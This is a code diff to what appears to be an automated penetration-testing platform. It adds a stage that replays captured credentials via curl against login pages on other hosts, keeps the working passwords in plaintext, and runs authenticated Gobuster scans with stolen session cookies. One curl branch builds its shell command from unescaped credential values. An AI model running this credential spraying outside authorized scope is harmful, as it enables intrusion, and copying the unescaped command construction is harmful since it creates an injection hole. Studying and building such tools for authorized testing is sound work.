@@ -3731,6 +3731,9 @@ Return ONLY a JSON object with vulnerabilities array. No markdown, no explanatio
 
                 // ── Update stats and check fine-tuning threshold ──
                 (state as any).exploitStats = { total: totalOrchestrated + templateExploits.length, succeeded: totalSucceeded, failed: totalFailed, recipesGenerated };
+                // ── Fix: Sync exploit stats to state.stats for UI display ──
+                state!.stats.exploitsAttempted = (state!.stats.exploitsAttempted || 0) + totalOrchestrated + templateExploits.length;
+                state!.stats.exploitsSucceeded = (state!.stats.exploitsSucceeded || 0) + totalSucceeded;
                 addLog(state!, { phase: 'exploitation', type: 'success', title: '\u{1f4ca} Exploitation Complete', detail: `${totalSucceeded}/${totalOrchestrated + templateExploits.length} succeeded, ${totalFailed} failed, ${recipesGenerated} recipes generated — evidence persisted to DB` });
 
                 // ── LLM Exploit Validation Analyst: Generate Audit Trail ──
@@ -3761,6 +3764,107 @@ Return ONLY a JSON object with vulnerabilities array. No markdown, no explanatio
 
               // Persist after exploitation
               await persistOpsStateNow(input.engagementId).catch(() => {});
+
+              // ── Post-Exploitation: Execute Credential Reuse Testing ──
+              const credReuseQueue = (state as any).pendingCredentialReuseTests || [];
+              if (credReuseQueue.length > 0) {
+                addLog(state!, { phase: 'exploitation', type: 'info', title: '🔑 Credential Reuse Testing: Starting', detail: `Testing ${credReuseQueue.length} credential set(s) against other engagement assets` });
+                for (const reuseTest of credReuseQueue) {
+                  for (const targetHost of reuseTest.targetHosts) {
+                    try {
+                      const targetAsset = state!.assets.find((a: any) => a.hostname === targetHost);
+                      const webPorts = (targetAsset?.ports || []).filter((p: any) => [80, 443, 8080, 8443].includes(p.port) || p.service?.includes('http'));
+                      for (const portEntry of webPorts.slice(0, 2)) {
+                        const reuseScheme = portEntry.port === 443 || portEntry.port === 8443 ? 'https' : 'http';
+                        const reuseUrl = `${reuseScheme}://${targetHost}:${portEntry.port}${reuseTest.loginPath}`;
+                        const reuseCmd = reuseTest.method === 'post_form'
+                          ? `curl -sS -k --connect-timeout 8 --max-time 15 -w '\n%{http_code}|%{size_download}|%{redirect_url}' -L -X POST -d 'username=${encodeURIComponent(reuseTest.username)}&password=${encodeURIComponent(reuseTest.password)}' '${reuseUrl}'`
+                          : `curl -sS -k --connect-timeout 8 --max-time 15 -w '\n%{http_code}|%{size_download}|%{redirect_url}' -L -u '${reuseTest.username}:${reuseTest.password}' '${reuseUrl}'`;
+                        const { executeRawCommand } = await import('../lib/scan-server-executor');
+                        const reuseResult = await executeRawCommand(reuseCmd, 20);
+                        const reuseOutput = typeof reuseResult === 'string' ? reuseResult : (reuseResult?.stdout || '');
+                        const reuseLines = reuseOutput.trim().split('\n');
+                        const reuseMeta = reuseLines[reuseLines.length - 1];
+                        const [reuseStatus, reuseSize, reuseRedirect] = reuseMeta.split('|');
+                        const reuseBody = reuseLines.slice(0, -1).join('\n');
+                        const reuseSuccess = (
+                          (reuseStatus !== '401' && reuseStatus !== '403' && reuseStatus !== '404') &&
+                          (Number(reuseSize) > 200) &&
+                          (/dashboard|welcome|logout|sign.?out|my.?account|profile|session|authenticated/i.test(reuseBody) ||
+                           (reuseRedirect && /dashboard|admin|panel|home|account/i.test(reuseRedirect)))
+                        );
+                        if (reuseSuccess) {
+                          state!.stats.exploitsAttempted = (state!.stats.exploitsAttempted || 0) + 1;
+                          state!.stats.exploitsSucceeded = (state!.stats.exploitsSucceeded || 0) + 1;
+                          addLog(state!, {
+                            phase: 'exploitation', type: 'exploit_success',
+                            title: `✅ Credential Reuse Succeeded: ${targetHost}:${portEntry.port}`,
+                            detail: `Credentials from ${reuseTest.sourceHost} (${reuseTest.username}:***) also work on ${targetHost}:${portEntry.port}. ` +
+                              `HTTP ${reuseStatus} (${reuseSize}B).${reuseRedirect ? ` Redirect: ${reuseRedirect}` : ''} ` +
+                              `This confirms shared credentials or a common authentication backend.`,
+                            riskTier: 'red',
+                            data: {
+                              evidenceType: 'credential_reuse',
+                              sourceHost: reuseTest.sourceHost, targetHost, port: portEntry.port,
+                              username: reuseTest.username, status: reuseStatus, size: reuseSize,
+                              redirect: reuseRedirect || null,
+                              responseSnippet: reuseBody.slice(0, 500),
+                            },
+                          });
+                          // Push to target asset confirmedCredentials
+                          if (targetAsset && Array.isArray(targetAsset.confirmedCredentials)) {
+                            targetAsset.confirmedCredentials.push({
+                              username: reuseTest.username, password: reuseTest.password,
+                              service: reuseTest.method === 'post_form' ? 'http-post-form' : 'http-get',
+                              port: portEntry.port, protocol: reuseScheme,
+                              accessLevel: 'authenticated', source: 'credential-reuse',
+                              confirmedAt: Date.now(), validated: true,
+                              reuseSource: reuseTest.sourceHost,
+                            });
+                          }
+                        } else {
+                          state!.stats.exploitsAttempted = (state!.stats.exploitsAttempted || 0) + 1;
+                          addLog(state!, {
+                            phase: 'exploitation', type: 'info',
+                            title: `🔒 Credential Reuse Failed: ${targetHost}:${portEntry.port}`,
+                            detail: `Credentials from ${reuseTest.sourceHost} do NOT work on ${targetHost}:${portEntry.port}. HTTP ${reuseStatus} (${reuseSize}B). Different auth backend or credentials rotated.`,
+                          });
+                        }
+                      }
+                    } catch (reuseErr: any) {
+                      addLog(state!, { phase: 'exploitation', type: 'warning', title: `⚠️ Credential Reuse Error: ${targetHost}`, detail: reuseErr.message?.slice(0, 200) });
+                    }
+                  }
+                }
+                addLog(state!, { phase: 'exploitation', type: 'phase_complete', title: '🔑 Credential Reuse Testing Complete', detail: `Tested credentials against ${credReuseQueue.reduce((s: number, t: any) => s + t.targetHosts.length, 0)} target(s)` });
+              }
+
+              // ── Post-Exploitation: Execute Authenticated Re-Scans ──
+              const authRescanQueue = (state as any).pendingAuthenticatedRescans || [];
+              if (authRescanQueue.length > 0) {
+                addLog(state!, { phase: 'exploitation', type: 'info', title: '🔐 Authenticated Re-Scan: Starting', detail: `Running ZAP + Gobuster with captured credentials on ${authRescanQueue.length} target(s) to discover vulns behind login` });
+                for (const rescanItem of authRescanQueue) {
+                  try {
+                    const targetAsset = state!.assets.find((a: any) => a.hostname === rescanItem.targetHost);
+                    if (targetAsset && rescanItem.sessionCookie) {
+                      // Run authenticated Gobuster
+                      const { executeTool } = await import('../lib/scan-server-executor');
+                      const gobusterCmd = `dir -u ${rescanItem.port === 443 ? 'https' : 'http'}://${rescanItem.targetHost}:${rescanItem.port}/ -w /usr/share/wordlists/dirb/common.txt -c "${rescanItem.sessionCookie}" -t 10 --timeout 10s -s 200,301,302,403`;
+                      const gobResult = await executeTool({ tool: 'gobuster', args: gobusterCmd, timeout: 120 });
+                      const authPaths = (gobResult.stdout || '').split('\n').filter((l: string) => l.match(/Status:\s*(200|301|302)/)).length;
+                      addLog(state!, {
+                        phase: 'exploitation', type: 'info',
+                        title: `📂 Authenticated Content Discovery: ${rescanItem.targetHost}`,
+                        detail: `Gobuster (authenticated) found ${authPaths} additional paths behind login on ${rescanItem.targetHost}:${rescanItem.port}`,
+                        data: { paths: authPaths, output: (gobResult.stdout || '').slice(0, 1000) },
+                      });
+                    }
+                  } catch (rescanErr: any) {
+                    addLog(state!, { phase: 'exploitation', type: 'warning', title: `⚠️ Auth Re-Scan Error: ${rescanItem.targetHost}`, detail: rescanErr.message?.slice(0, 200) });
+                  }
+                }
+                addLog(state!, { phase: 'exploitation', type: 'phase_complete', title: '🔐 Authenticated Re-Scan Complete', detail: `Scanned ${authRescanQueue.length} target(s) with validated credentials` });
+              }
             }
 
             // Recalculate stats from actual asset data before marking complete
